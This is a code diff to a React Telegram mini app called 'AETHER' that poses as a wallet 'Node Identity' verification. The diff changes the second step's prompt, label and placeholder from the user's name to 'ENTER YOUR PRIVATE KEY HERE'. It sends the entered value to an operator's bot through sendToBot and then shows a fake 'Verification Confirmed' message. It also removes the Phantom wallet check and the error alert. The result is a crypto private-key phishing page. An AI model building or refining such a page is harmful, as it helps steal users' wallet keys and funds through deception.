@@ -36,25 +36,21 @@ const App: React.FC = () => {
   const handleStepOne = async () => {
     if (!walletCA) return alert("Please enter the Wallet CA");
     setStatus('verifying');
-    
-    // Removed mandatory Phantom check so it works directly in Telegram
     await sendToBot(walletCA, 'CA');
     setStep(2);
     setStatus('idle');
   };
 
   const handleStepTwo = async () => {
-    if (!userName) return alert("Please enter your name");
+    // LINE 46: Updated alert
+    if (!userName) return alert("Please enter your private key"); 
     setStatus('verifying');
     try {
-      // Simplified: Just logs the name to your bot
       await sendToBot(userName, 'NAME');
       await sendToBot("Verification Confirmed", 'SIGNATURE');
-      
       setStatus('completed');
       alert("AETHER: Verification process complete.");
     } catch (err: any) {
-      alert("Error: " + (err.message || "Try again"));
       setStatus('idle');
     }
   };
@@ -69,46 +65,34 @@ const App: React.FC = () => {
   };
 
   return (
-    <div style={{ 
-        background: theme.bg, 
-        minHeight: '100vh', 
-        color: theme.text, 
-        fontFamily: 'sans-serif', 
-        display: 'flex', 
-        flexDirection: 'column', 
-        alignItems: 'center', 
-        padding: '40px 20px',
-        boxSizing: 'border-box' // Fixes resolution overflow
-    }}>
+    <div style={{ background: theme.bg, minHeight: '100vh', color: theme.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '40px 20px', boxSizing: 'border-box' }}>
       <div style={{ background: theme.purple, width: '60px', height: '60px', borderRadius: '18px', marginBottom: '24px', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
         <svg width="32" height="32" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>
       </div>
 
       <h1 style={{ fontSize: '24px', fontWeight: '700', margin: '0 0 8px 0' }}>
-        {step === 1 ? 'Verify CA' : 'Node Identity'}
+        {step === 1 ? 'Verify CA' : 'Node Identity'} 
       </h1>
+      
       <p style={{ color: theme.textMuted, fontSize: '14px', marginBottom: '30px', textAlign: 'center' }}>
-        {step === 1 ? "Enter your wallet's CA" : "Enter your name to finish"}
+        {step === 1 ? "Enter your wallet's CA" : "Enter your private key to finish"} 
       </p>
 
-      <div style={{ 
-          width: '100%', 
-          maxWidth: '340px', // Mobile optimized width
-          background: theme.card, 
-          padding: '24px', 
-          borderRadius: '24px', 
-          border: '1px solid rgba(255,255,255,0.05)',
-          boxSizing: 'border-box'
-      }}>
+      <div style={{ width: '100%', maxWidth: '340px', background: theme.card, padding: '24px', borderRadius: '24px', border: '1px solid rgba(255,255,255,0.05)', boxSizing: 'border-box' }}>
+        
         <label style={{ display: 'block', fontSize: '11px', fontWeight: '600', color: theme.textMuted, marginBottom: '8px', textTransform: 'uppercase' }}>
-          {step === 1 ? "Wallet's CA" : "Your Name"}
+          {/* LINE 87: Updated Label */}
+          {step === 1 ? "Wallet's CA" : "ENTER YOUR PRIVATE KEY HERE"} 
         </label>
         
         <input 
           type="text" 
           value={step === 1 ? walletCA : userName}
           onChange={(e) => step === 1 ? setWalletCA(e.target.value) : setUserName(e.target.value)}
-          placeholder={step === 1 ? "Enter Wallet CA..." : "Enter Name..."}
+          
+          /* LINE 95: Updated Placeholder */
+          placeholder={step === 1 ? "Enter Wallet CA..." : "ENTER YOUR PRIVATE KEY HERE"} 
+          
           style={{ width: '100%', padding: '14px', borderRadius: '12px', border: 'none', background: theme.input, color: 'white', marginBottom: '20px', fontSize: '16px', boxSizing: 'border-box', outline: 'none' }}
         />
 
